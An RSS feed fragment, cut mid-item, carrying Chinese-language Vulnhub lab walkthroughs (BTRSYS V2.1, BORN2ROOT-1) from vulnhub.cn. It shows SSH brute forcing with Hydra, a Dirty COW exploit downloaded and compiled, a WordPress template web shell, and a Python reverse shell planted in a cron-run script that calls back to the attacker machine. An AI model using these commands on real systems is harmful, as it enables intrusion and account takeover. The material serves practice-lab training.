&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hydra -L user -P 1.txt 10.0.2.9 ssh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Hydra v9.3 (c) &lt;span style="color:#b452cd">2022&lt;/span> by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span style="color:#8b008b;font-weight:bold">do&lt;/span> not use in military or secret service organizations, or &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t &lt;span style="color:#b452cd">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[DATA] max &lt;span style="color:#b452cd">16&lt;/span> tasks per &lt;span style="color:#b452cd">1&lt;/span> server, overall &lt;span style="color:#b452cd">16&lt;/span> tasks, &lt;span style="color:#b452cd">1688&lt;/span> login tries (l:2/p:844), ~106 tries per task
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[DATA] attacking ssh://10.0.2.9:22/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[22][ssh] host: 10.0.2.9 login: tiago password: Virgulino
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>获得tiago的密码&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/249/4.webp" alt="4">&lt;/p>
&lt;p>ssh登陆成功&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/249/5.webp" alt="5">&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>&lt;a href="https://www.iihack.com/pages/tools/linpeas.sh.html">linpeas.sh&lt;/a>跑了遍，打算使用脏牛提权，运行成功后管理员密码被修改为&lt;code>dirtyCowFun&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://www.exploit-db.com/download/40847 -O 40847.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.c -lutil
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./dcow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/249/6.webp" alt="6">&lt;/p>- https://www.vulnhub.cn/walkthrough/249/ - This is a customized copyright.</description></item><item><title>Vulnhub 196 BTRSYS V2.1</title><link>https://www.vulnhub.cn/walkthrough/196/</link><pubDate>Mon, 31 Jul 2017 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/196/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/196/ -&lt;p>考点：wordpress&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/btrsys-v21,196/">https://www.vulnhub.com/entry/btrsys-v21,196/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.15&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>BTRSYS: V2.1&lt;/td>
&lt;td>10.0.2.17&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.17
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;p>看来要在web突破&lt;/p>
&lt;h4 id="dirsearch">dirsearch&lt;/h4>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirsearch -u http://10.0.2.17
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/1.webp" alt="1">&lt;/p>
&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
&lt;p>访问wordpress发现弱口令&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/2.webp" alt="2">&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;p>修改wordpress模板文件&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/3.webp" alt="3">&lt;/p>
&lt;p>使用antsword连接&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/4.webp" alt="4">&lt;/p>
&lt;p>另外发现&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/5.webp" alt="5">&lt;/p>
&lt;p>未利用成功&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>先在kali上编译好&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/6.webp" alt="6">&lt;/p>
&lt;p>下载到靶机运行获得root权限。&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/196/7.webp" alt="7">&lt;/p>- https://www.vulnhub.cn/walkthrough/196/ - This is a customized copyright.</description></item><item><title>Vulnhub 197 BORN2ROOT-1</title><link>https://www.vulnhub.cn/walkthrough/197/</link><pubDate>Sat, 10 Jun 2017 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/197/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/197/ -&lt;p>考点：id_rsa,hydra&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/born2root-1,197/">https://www.vulnhub.com/entry/born2root-1,197/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.24&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>BORN2ROOT-1&lt;/td>
&lt;td>10.0.2.40&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.40
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">1024&lt;/span> 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.10 ((Debian))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-robots.txt: &lt;span style="color:#b452cd">2&lt;/span> disallowed entries
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_/wordpress-blog /files
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Secretsec Company
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.10 (Debian)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>111/tcp open rpcbind 2-4 (RPC &lt;span style="color:#228b22">#100000)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| rpcinfo:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| program version port/proto service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100000&lt;/span> 2,3,4 111/tcp rpcbind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100000&lt;/span> 2,3,4 111/udp rpcbind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100000&lt;/span> 3,4 111/tcp6 rpcbind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100000&lt;/span> 3,4 111/udp6 rpcbind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100024&lt;/span> &lt;span style="color:#b452cd">1&lt;/span> 42589/udp status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100024&lt;/span> &lt;span style="color:#b452cd">1&lt;/span> 44269/udp6 status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">100024&lt;/span> &lt;span style="color:#b452cd">1&lt;/span> 59185/tcp6 status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">100024&lt;/span> &lt;span style="color:#b452cd">1&lt;/span> 60456/tcp status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>60456/tcp open status &lt;span style="color:#b452cd">1&lt;/span> (RPC &lt;span style="color:#228b22">#100024)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;h4 id="端口80">端口80&lt;/h4>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/1.webp" alt="1">&lt;/p>
&lt;p>获得用户名三个 &lt;code>martin hadi jimmy&lt;/code>&lt;/p>
&lt;p>访问robots.txt获得两个目录&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/2.webp" alt="2">&lt;/p>
&lt;p>两个目录都无有用信息&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gobuster dir --url http://10.0.2.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/3.webp" alt="3">&lt;/p>
&lt;p>访问&lt;code>icons&lt;/code>目录发现目录可访问&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/4.webp" alt="4">&lt;/p>
&lt;p>发现ssh登录认证密钥&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/5.webp" alt="5">&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;h3 id="martin">martin&lt;/h3>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/6.webp" alt="6">&lt;/p>
&lt;p>这就尴尬了，查一下这个异常报错是因为DSA密钥的问题，可以&lt;a href="https://www.cnblogs.com/fly2wind/p/15640719.html">修改配置文件&lt;/a> 或者ssh登录时加参数 &lt;code>-o PubkeyAcceptedKeyTypes=+ssh-rsa&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/7.webp" alt="7">&lt;/p>
&lt;p>咋的，还得输入密码，目测是&lt;code>.bashrc&lt;/code> 加了登录启动脚本，回车一下绕过了，还是看看这个脚本&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/8.webp" alt="8">&lt;/p>
&lt;p>下载文件发现&lt;code>wget&lt;/code>和&lt;code>curl&lt;/code>都不能用&lt;/p>
&lt;p>还是修改&lt;code>.ssh/config&lt;/code>添加&lt;code>PubkeyAcceptedKeyTypes +ssh-rsa&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/9.webp" alt="9">&lt;/p>
&lt;p>通过sftp上传&lt;code>linpeas.sh&lt;/code>和&lt;code>pspy&lt;/code>&lt;/p>
&lt;h3 id="jinmy">jinmy&lt;/h3>
&lt;p>通过&lt;code>linpeas.sh&lt;/code>发现&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/10.webp" alt="10">&lt;/p>
&lt;p>&lt;code>jimmy&lt;/code>权限每隔五分钟运行&lt;code>/tmp/sekurity.py&lt;/code>去/tmp目录发现文件不存在，那就新建文件反弹shell了&lt;/p>
&lt;p>新建文件&lt;code>/tmp/sekurity.py&lt;/code> 内容为&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>, &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>, &lt;span style="color:#008b45;text-decoration:underline">subprocess&lt;/span>, &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((&lt;span style="color:#cd5555">&amp;#39;10.0.2.24&amp;#39;&lt;/span>, &lt;span style="color:#b452cd">444&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.dup2(s.fileno(), &lt;span style="color:#b452cd">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.dup2(s.fileno(), &lt;span style="color:#b452cd">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.dup2(s.fileno(), &lt;span style="color:#b452cd">2&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p = subprocess.call([&lt;span style="color:#cd5555">&amp;#34;/bin/sh&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;-i&amp;#34;&lt;/span>])
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>过了几分钟收到反弹shell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/11.webp" alt="11">&lt;/p>
&lt;h3 id="hadi">hadi&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ cewl -w pass http://10.0.2.40/
&lt;/code>&lt;/pre>&lt;p>看了看，把&lt;code>martin hadi jimmy&lt;/code>也加到pass里&lt;/p>
&lt;p>使用john生成增强字典&lt;/p>
&lt;pre tabindex="0">&lt;code>$ john --wordlist=pass --rules=best64 --stdout &amp;gt;pass2
&lt;/code>&lt;/pre>&lt;p>使用hydra爆破用户&lt;code>hadi&lt;/code>的密码&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hydra -l hadi -P pass2 -f 10.0.2.40 ssh
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/12.webp" alt="12">&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>登录上去发现文件&lt;code>.gdb_history&lt;/code>应该是直接可以获得root权限&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/197/13.webp" alt="13">&lt;/p>- https://www.vulnhub.cn/walkthrough/197/ - This is a customized copyright.</description></item></channel></rss>